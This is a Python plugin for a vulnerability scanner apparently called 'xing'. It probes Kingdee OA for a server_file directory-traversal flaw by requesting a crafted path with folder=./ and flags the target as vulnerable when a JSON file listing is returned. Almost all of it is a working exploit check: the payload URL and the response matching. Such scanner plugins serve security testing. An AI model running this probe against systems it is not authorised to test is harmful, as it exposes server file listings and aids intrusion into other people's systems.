from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


# 参考 https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/5e5be1bb9d1c0431a66e958bf6eb86fef5a21077/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%87%91%E8%9D%B6OA/%E9%87%91%E8%9D%B6OA%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "金蝶OA server_file 目录遍历漏洞"
        self.app_name = 'Kingdee'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        payload = "/appmonitor/protected/selector/server_file/files?zz=1&folder=./&suffix="
        url = target + payload

        conn = http_req(url)
        if b"<" in conn.content:
            self.logger.debug("found < in content")
            return False

        if b'"rows":[{"name"' in conn.content:
            self.logger.success("found 金蝶OA  vuln {}".format(url))
            return url

